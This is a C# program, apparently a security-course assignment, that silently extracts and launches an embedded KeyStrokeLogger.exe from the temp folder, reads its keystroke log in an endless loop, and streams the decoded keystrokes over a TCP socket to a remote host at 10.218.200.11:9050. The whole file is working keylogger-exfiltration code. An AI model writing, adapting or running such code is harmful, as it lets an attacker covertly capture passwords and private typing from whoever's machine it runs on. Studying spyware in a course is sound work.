using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;



namespace COMP_6700_Assignment1
{
    class ClassWork
    {
        static Process loggerProcess = null;
        public static void Main()
        {
            AppDomain.CurrentDomain.ProcessExit += (s, e) => StopLogger();

            try
            {
                const int SERVER_WAIT_TIME = 5000;
                const int PROCESS_KILL_DELAY = 1000; 
                bool connected = false;
                string data;
                IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("10.218.200.11"), 9050);
                Socket server = null;

                foreach (var process in Process.GetProcessesByName("KeyStrokeLogger"))
                {
                    try 
                    { 
                        process.Kill();
                        process.WaitForExit(PROCESS_KILL_DELAY); 
                    } 
                    catch
                    { 
                        
                    }
                }

                while (!connected)
                {

                    try
                    {
                        server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        server.Connect(ipep);
                        connected = true;
                    }
                    catch (SocketException e)
                    {
                        server?.Close();
                        Console.WriteLine("Unable to connect to server. Trying to reconnect in 5 seconds..."); ;
                        Thread.Sleep(SERVER_WAIT_TIME);
                    }

                }

                // 1. Setup the Temporary Workspace
                string workDir = Path.Combine(Path.GetTempPath(), "COMP6700_Work");
                if (!Directory.Exists(workDir))
                {
                    Directory.CreateDirectory(workDir);
                }

                // 2. Define the paths
                string loggerExePath = Path.Combine(workDir, "KeyStrokeLogger.exe");
                string logFilePath = Path.Combine(workDir, "key_stroke.log");

                // 3. Extract the resources 
                ExtractResource("COMP_6700_Assignment1.KeyStrokeLogger.exe", loggerExePath);
                ExtractResource("COMP_6700_Assignment1.key_stroke.log", logFilePath);

                // 4. Start the Logger inside that temp folder
                ProcessStartInfo startInfo = new ProcessStartInfo(loggerExePath);
                startInfo.WorkingDirectory = workDir; // Vital: Logger writes to the temp log
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                loggerProcess = Process.Start(startInfo);

                // 5. Open your streams using the NEW temp path
                FileStream fs1 = new FileStream(logFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                NetworkStream ns = new NetworkStream(server);
                StreamReader sr = new StreamReader(fs1);
                StreamWriter sw = new StreamWriter(ns);
                StringBuilder sb = new StringBuilder();

                //Infinite loop in order to keep this program going indefinitely
                while (true)
                {
                    //checks to see if the string reader is at the end of the file after 10 sec (i.e. more info is added to the file)
                    if (sr.Peek() > -1)
                    {
                        // Read all the info from the file
                        while (sr.Peek() > -1)
                        {
                            sb.Append(sr.ReadLine());
                        }

                        //Converts simple string to string builder object.
                        String input = sb.ToString();

                        //Avoids processing same data twice 
                        sb.Clear();

                        //Parsing the input and string the parsed info in p string array.
                        char[] h = { ',', '/', '*' };
                        String[] p;
                        p = input.Split(h);

                        //Showing the parsed data
                        for (int i = 0; i < p.Length; i++)
                        {
                            switch(p[i])
                            {
                                case "Space":
                                    p[i] = " ";
                                    break;
                                case "Oemcomma":
                                    p[i] = ",";
                                    break;
                                case "OemMinus":
                                    p[i] = "-";
                                    break;
                                case "Oemplus":
                                    p[i] = "+";
                                    break;
                                case "OemPeriod":
                                    p[i] = ".";
                                    break;
                                case "OemQuestion":
                                    p[i] = "?";
                                    break;
                                case "D1":
                                    p[i] = "1";
                                    break;
                                case "D2":
                                    p[i] = "2";
                                    break;
                                case "D3":
                                    p[i] = "3";
                                    break;
                                case "D4":
                                    p[i] = "4"; 
                                    break;
                                case "D5":
                                    p[i] = "5";
                                    break;
                                case "D6":
                                    p[i] = "6";
                                    break;
                                case "D7":
                                    p[i] = "7";
                                    break;
                                case "D8":
                                    p[i] = "8";
                                    break;
                                case "D9":
                                    p[i] = "9";
                                    break;
                                case "D0":
                                    p[i] = "0";
                                    break;
                                /*case "Back":
                                    p[i] = " (Backspace) ";
                                    break;
                                case "LShiftKey":
                                    p[i] = " (Left Shift) ";
                                    break;
                                case "RShiftKey":
                                    p[i] = " (Right Shift) ";
                                    break;*/
                                default:
                                    break;
                            }

                            //Writing it into a file
                            Console.WriteLine(p[i]);
                            sw.WriteLine(p[i]);
                        }

                        //Flushes the buffer of the string writer to force an immediate output to the .txt file
                        sw.Flush();
                    }
                    sr.DiscardBufferedData(); //Gets rid of leftover data in the string reader
                    //Thread.Sleep(DATA_TRANSMISSION_INTERVAL); //Wait 10 secs
                }
            }

            finally
            {
                StopLogger();
            }
        }

        private static void StopLogger()
        {
            if (loggerProcess != null && !loggerProcess.HasExited)
            {
                Console.WriteLine("Closing Logger process...");
                loggerProcess.Kill(); // Forcefully stops the logger
                loggerProcess.Dispose();
            }
        }

        private static void ExtractResource(string resourceName, string outputPath)
        {
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream == null) throw new Exception("Resource not found: " + resourceName);
                using (FileStream fileStream = new FileStream(outputPath, FileMode.Create))
                {
                    stream.CopyTo(fileStream);
                }
            }
        }
    }
}

